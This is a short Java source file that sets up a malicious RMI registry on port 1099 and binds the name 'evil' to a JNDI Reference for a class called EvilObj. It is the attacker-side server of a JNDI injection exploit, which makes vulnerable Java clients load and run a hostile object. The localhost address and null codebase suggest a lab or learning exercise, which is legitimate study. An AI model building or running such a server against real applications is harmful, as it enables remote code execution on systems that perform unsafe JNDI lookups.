package com.boyuan.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) {

        try {
            LocateRegistry.createRegistry(1099);

            String FactoryURL = "http://localhost:9999/";

            Registry registry = LocateRegistry.getRegistry();

            System.out.println("Create RMI registry on port 1099");

            Reference reference = new Reference("com.boyuan.rmi.EvilObj", "com.boyuan.rmi.EvilObj", null);

            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

            registry.bind("evil", referenceWrapper);

            System.out.println("Ready!");
            System.out.println("Waiting for connection......");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
